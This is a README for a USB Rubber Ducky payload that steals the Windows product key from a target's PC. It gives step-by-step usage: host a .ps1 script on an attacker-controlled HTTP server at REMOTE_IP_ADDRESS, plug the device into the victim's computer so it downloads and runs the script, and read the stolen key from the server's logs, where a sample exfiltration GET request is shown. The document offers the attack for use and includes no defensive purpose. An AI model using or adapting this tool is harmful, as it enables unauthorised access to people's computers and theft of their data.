<h1 align="center">
  <a href="https://git.io/typing-svg">
    <img src="https://readme-typing-svg.herokuapp.com/?lines=Windows+Product+Duckey+🦆🔑&center=true&size=25">
  </a>
</h1>

## Description

This payload exfiltrate the target's Windows product key to a remote server. *Only works on Windows 10,11.*

## Demo

<h2 align="center">
  <img src="https://raw.githubusercontent.com/Who-Is-Julien/Ducky-Scripts/main/Windows-Product-Duckey/demo.gif">
</h2>

Here we can see that the attacker's server received the following request:
```
GET /?duckey=A1B2C-3D4E5-F6G6F-5E4D3-C2B1A HTTP/1.1
```
*Which contains the target's Windows product key!*

## Usage

To use this script, follow these steps:

1. Set up a website on your server or a computer in the same network as the target's computer. You can use Python to do this by running the following command:
```
python -m http.server 80
```
2. Download the payload.txt and .ps1 files and modify them to include the IP address of your server.
3. Move the modified .ps1 file to the root directory of your website, so it is downloadable from this address:
```
http://REMOTE_IP_ADDRESS/.ps1
```
4. Plug in your device that is configured with the modified payload.txt to the target's computer.
5. Wait for the target to download and execute the .ps1 file from your website. You can track the target's IP address and Windows product key by checking your website logs.



***Note**: This script is designed to send the results to a specific server, so you don't have to rely on any file sharing services. Additionally, you can easily adapt it to work with encrypted sites.*
